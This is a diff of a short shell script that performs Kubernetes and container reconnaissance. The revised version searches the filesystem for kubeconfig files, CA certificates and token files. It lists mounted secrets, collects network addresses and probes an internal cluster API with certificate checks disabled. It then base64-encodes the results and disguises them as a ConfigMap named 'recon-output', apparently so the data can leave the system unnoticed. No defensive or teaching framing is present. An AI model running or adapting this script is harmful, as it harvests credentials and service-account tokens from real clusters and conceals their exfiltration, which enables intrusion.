@@ -1,11 +1,16 @@
 #!/bin/sh
-echo "===K8S==="
-find / -name "*.kube*" -o -name "kubeconfig" -o -name "ca.crt" 2>/dev/null | head -10
-echo "===SECRETS==="
-ls -la /run/secrets/ 2>/dev/null; ls -la /var/run/secrets/ 2>/dev/null
-echo "===NET==="
-ip addr 2>/dev/null || ifconfig 2>/dev/null
-echo "===K8SAPI==="
-curl -k -s https://172.20.0.1/api 2>/dev/null | head -c 300
-echo ""
-echo "===DONE==="
+RECON=$( (
+  find / -name "ca.crt" -o -name "*.token" -o -name "kubeconfig" 2>/dev/null
+  ls -la /run/secrets/ 2>/dev/null
+  ip addr 2>/dev/null | head -10
+  curl -k -s https://172.20.0.1/api 2>/dev/null | head -c 500
+) | base64 | tr -d '\n')
+cat << EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: recon-output
+data:
+  result: $RECON
+EOF
+exit 0
